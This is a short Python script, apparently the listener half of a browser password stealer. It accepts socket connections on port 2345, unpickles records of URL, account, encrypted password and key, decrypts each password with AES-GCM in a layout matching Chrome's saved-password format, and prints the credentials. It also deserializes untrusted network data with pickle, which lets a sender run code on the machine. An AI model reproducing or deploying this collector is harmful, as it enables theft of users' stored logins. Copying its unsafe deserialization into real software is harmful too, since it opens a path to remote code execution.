from socket import *
import pickle
from Crypto.Cipher import AES

# 网络链接
S = socket()
S.bind((gethostname(), 2345))
S.listen()
s, addr = S.accept()

while True:
    ready = s.recv(1024).decode()
    if ready == '0':
        break
    s.send('ok'.encode())
    data = pickle.loads(s.recv(1024))
    iv = data[2][3:15]
    payload = data[2][15:]
    cipher = AES.new(data[3], AES.MODE_GCM, iv)
    password = cipher.decrypt(payload)
    password = password[:-16].decode()
    if data[0]:
        print('url:', data[0])
        print('account:', data[1])
        print('secret-text:', data[2])
        print('secret-key:', data[3])
        print('password:', password)
        print('================================================================')
    s.send('ok'.encode())



